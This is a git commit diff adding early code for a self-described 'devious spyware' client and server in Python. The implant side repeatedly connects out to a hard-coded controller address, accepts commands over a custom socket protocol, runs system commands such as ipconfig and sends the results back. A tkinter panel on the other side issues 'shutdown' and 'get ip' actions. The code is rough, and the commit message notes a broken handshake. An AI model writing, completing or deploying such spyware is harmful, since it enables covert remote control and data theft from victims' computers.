27512d8c2a36ce7b5795248b59261e60a76e1009
rufus173 <166658338+rufus173@users.noreply.github.com>
2024-04-19 11:08:08 +0100

    Add files via upload
    be aware problem with the handshake function

--- devious spyware client.py
+++ devious spyware client.py
@@ -1,6 +1,8 @@
 import socket
 import tkinter
+import time
 import tkinter.font
+import threading
 #class for connection
 #class for gui (maybe if i get round to it)
 class remote_connection:
@@ -28,10 +30,11 @@ class remote_connection:
                 break
             self.server.sendall(b"_")
             receive_buffer.append(recv.decode())
-        print("half handshake completed, new buffer of",receive_buffer)
+        return receive_buffer
 class window(remote_connection):
     def __init__(self) -> None:
         super().__init__()
+        self.outgoing_buffer = []
         self.root = tkinter.Tk()
         default_font = tkinter.font.nametofont("TkDefaultFont")
         default_font.configure(size=18)
@@ -52,6 +55,41 @@ class window(remote_connection):
         self.status_label.grid(row=0,column=0,sticky=tkinter.NSEW)
         
         #the stack box (what is happening and the contents of the buffer)
+        self.stack_box = tkinter.LabelFrame(self.root,fg="green",bg="grey")
+        self.stack_box.grid(row=0,column=2,rowspan=2,columnspan=1)
+        self.stack_text = tkinter.Text(self.stack_box,fg="green",bg="black")
+        self.stack_text.grid(row=0,column=0,sticky=tkinter.NSEW)
         
+        #quick actions pannel
+        self.quick_actions_frame = tkinter.LabelFrame(self.root,fg="green",bg="grey",text="quick actions")
+        self.quick_actions_frame.grid(row=1,column=0,columnspan=2,sticky=tkinter.NSEW)
+        self.shutdown_button = tkinter.Button(self.quick_actions_frame,
+                                              fg="black",bg="grey",text="shutdown",
+                                              command=lambda:self.quick_action(action="shutdown"))
+        self.shutdown_button.grid(row=0,column=0,columnspan=1,sticky=tkinter.NSEW)
+        self.ip_button = tkinter.Button(self.quick_actions_frame,
+                                              fg="black",bg="grey",text="get ip",
+                                              command=lambda:self.quick_action(action="ip address"))
+        self.ip_button.grid(row=0,column=1,columnspan=1,sticky=tkinter.NSEW)
+        
+        #upkeep of the program
+        threading.Thread(target=self.mainloop).start()
         self.root.mainloop()
+    def mainloop(self):
+        while True:
+            time.sleep(0.5)
+            self.incoming_buffer = self.handshake(self.outgoing_buffer)
+            self.outgoing_buffer = []
+            print(self.incoming_buffer)
+            for i in self.incoming_buffer:
+                self.stack_text.insert(tkinter.END,i)
+            self.incoming_buffer = []
+    def quick_action(self,action):
+        print(action)
+        self.stack_text.insert(tkinter.END,">>> "+action)
+        match action:
+            case "shutdown":
+                self.outgoing_buffer.append("shutdown") 
+            case "ip address":
+                self.outgoing_buffer.append("ip address")
 window()
--- devious spyware server.py
+++ devious spyware server.py
@@ -5,32 +5,72 @@ import subprocess
 #establishing standards:
 #b'_' acknowledgement
 #b'&end' signifys finnishing a transmition
+class terminal:
+    def __init__(self) -> None:
+        pass
+    def run_command(self,command):
+        command = command.split(" ")
+        result = subprocess.run(command, stdout=subprocess.PIPE).stdout.decode()
+        return result
 class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
     def __init__(self) -> None:
         self.server = socket.socket()
         self.connect()
     def connect(self):
-        self.server.connect(("192.168.1.141",8017))
-        self.handshake(["connected"])
-    def handshake(self,buffer):
-        receive_buffer = []
-        self.server.recv(1024)
-        self.server.sendall(b"_")
         while True:
-            recv = self.server.recv(1024)
-            if recv == b"&end":
+            try:
+                self.server.connect(("192.168.1.141",8017))
                 break
-            self.server.sendall(b"_")
-            receive_buffer.append(recv.decode())
-        print("half handshake completed, new buffer of",receive_buffer)
-        self.server.sendall(b"_")
-        self.server.recv(1024)
-        send_buffer = buffer
-        for i in send_buffer:
-            self.server.sendall(i.encode())
+            except:
+                print("connection not available, failed to connect")
+        self.handshake(["connected"])
+    def shutdown_socket(self):
+        self.server.shutdown(socket.SHUT_RDWR)
+        self.server.close()
+    def handshake(self,buffer):
+        try:
+            receive_buffer = []
             self.server.recv(1024)
-        self.server.sendall(b"&end")
-class terminal:
-    def __init__(self) -> None:
-        pass
+            self.server.sendall(b"_")
+            while True:
+                recv = self.server.recv(1024)
+                if recv == b"&end":
+                    break
+                self.server.sendall(b"_")
+                receive_buffer.append(recv.decode())
+            self.server.sendall(b"_")
+            self.server.recv(1024)
+            send_buffer = str(buffer)
+            for i in send_buffer:
+                self.server.sendall(i.encode())
+                self.server.recv(1024)
+            self.server.sendall(b"&end")
+            return receive_buffer
+        except Exception as problem:
+            print(problem)
+            self.shutdown_socket()
+            self.__init__()
 socket_handler = remote_connection()
+terminal = terminal()
+incoming_buffer = []
+outgoing_buffer = []
+while True:
+    try:
+        new_incoming_buffer = socket_handler.handshake(outgoing_buffer)
+        for i in new_incoming_buffer:
+            incoming_buffer.append(i)
+        print("buffer:",incoming_buffer)
+        counter = 0
+        for i in incoming_buffer:
+            del(incoming_buffer)[counter]
+            match i:
+                case "shutdown":
+                    print("shutting down")
+                case "ip address":
+                    print("getting ip address")
+                    for i in terminal.run_command("ipconfig").split("\n"):
+                        print("sending",i)
+                        outgoing_buffer.append(i)
+            counter += 1        
+    except Exception as problem:
+        print(problem)
